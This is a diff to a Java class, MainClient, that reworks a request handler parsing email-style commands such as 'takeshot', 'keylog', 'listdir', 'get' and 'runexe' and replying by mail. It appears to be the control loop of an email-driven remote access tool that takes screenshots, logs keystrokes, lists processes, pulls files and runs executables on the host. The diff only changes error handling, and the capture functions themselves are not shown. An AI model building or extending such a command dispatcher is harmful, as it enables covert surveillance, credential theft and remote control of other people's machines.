@@ -7,6 +7,7 @@ import java.nio.file.Path;
 import java.time.ZonedDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -173,51 +174,45 @@ public class MainClient {
             return false;
         }
     }
-    public static boolean WrongSyntaxB(int esac, int id){
-        List<String> list = List.of("Your request must be divided by \"/\"","The second Part of your request must be id", "What is your request ?");
-        try{
-            SendMail.getInstance().sendMail("res/"+Integer.toString(id)+"/"+ list.get(esac),"",null,false);
-        }catch (Exception e){
-            e.printStackTrace();
-            return false;
-        }
-        return false;
-    }
 
-    public static boolean processRequest(String header, String sender) throws ArrayIndexOutOfBoundsException {
-        if (!header.contains("/")) return WrongSyntaxB(0, 0000);
-        String[] parts = header.split("/");
-        System.out.println(Arrays.toString(parts));
-        if (parts.length <=1){ return  WrongSyntaxB(2,0000);}
-        int id = 0000;
+    public static boolean processRequest(String header, String sender) {
         try {
+            String[] parts = header.split("/");
+            System.out.println(Arrays.toString(parts));
+            int id = 0;
             id = Integer.parseInt(parts[1].trim());
-        }catch(NumberFormatException e){
-            System.out.println("Wrong id");
-            return WrongSyntaxB(1,0000);
-        }
-        if (parts.length < 3) return WrongSyntaxB(2,id);
-        String command = parts[2].trim();
-        if (command.equalsIgnoreCase("takeshot")) {
-            return takeShot(id, sender);
-        } else if (command.equalsIgnoreCase("keylog")) {
-            return keyLog(id, Long.parseLong(parts[3].trim()), sender);
-        }
+            String command = parts[2].trim();
+            if (command.equalsIgnoreCase("takeshot")) {
+                return takeShot(id, sender);
+            } else if (command.equalsIgnoreCase("keylog")) {
+                return keyLog(id, Long.parseLong(parts[3].trim()), sender);
+            }
 //        else if (command.equalsIgnoreCase("Shutdown")) {
 //            if (parts.length > 3)
 //                return Shutdown(id, parts[3].trim(), sender);
 //            return Shutdown(id, "", sender);}
-         else if (command.equalsIgnoreCase("ListProcess")) {
-            return ListProcess(id, sender);
-        } else if (command.equalsIgnoreCase("listdir")) {
-            return listDir(id, sender);
-        } else if (command.equalsIgnoreCase("get")) {
-            return getFile(id, header, sender);
-        } else if (command.equalsIgnoreCase("runexe")) {
-            String filepath = header.substring(19 + 1).trim();
-            return runexefile(id, filepath, sender);
+            else if (command.equalsIgnoreCase("ListProcess")) {
+                return ListProcess(id, sender);
+            } else if (command.equalsIgnoreCase("listdir")) {
+                return listDir(id, sender);
+            } else if (command.equalsIgnoreCase("get")) {
+                return getFile(id, header, sender);
+            } else if (command.equalsIgnoreCase("runexe")) {
+                String filepath = header.substring(19 + 1).trim();
+                return runexefile(id, filepath, sender);
+            }
+            throw new ArrayIndexOutOfBoundsException();
+        } catch (ArrayIndexOutOfBoundsException | NumberFormatException e) {
+            try {
+                SendMail.getInstance().sendMail("Invalid Syntax request", ""
+                        , null, true, sender);
+                return true;
+            } catch (IOException | MessagingException ex) {
+                ex.printStackTrace();
+                return false;
+            }
         }
-        return false;
+
     }
 
 
